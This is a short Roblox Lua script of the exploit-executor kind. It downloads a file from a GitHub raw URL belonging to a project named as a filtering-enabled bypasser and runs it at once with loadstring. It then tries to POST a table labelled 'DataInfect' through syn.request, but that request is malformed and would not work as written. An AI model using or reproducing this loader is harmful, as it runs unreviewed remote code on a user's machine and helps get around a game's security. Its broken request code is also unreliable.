scripts.script:
local URL = "https://raw.githubusercontent.com/G4mg1/ProjectLigmaFeBypasser/refs/heads/main/README.md"
local Response = game:HttpGet(URL)
if Response then
	loadstring(Response)()
	pcall(function()
		local DataInfect = {
			Attached = false;
			Data = nil;
			Loaded = false;
		}
		syn.request({
			Response;
			"Post";
			"Header" == "Content-Type: application/json";
			"Body" == game:GetService("HttpService"):JSONEncode({
				DataInfect.Data;
				DataInfect.Loaded;
				DataInfect.Attached
			})
		})
	end)
end
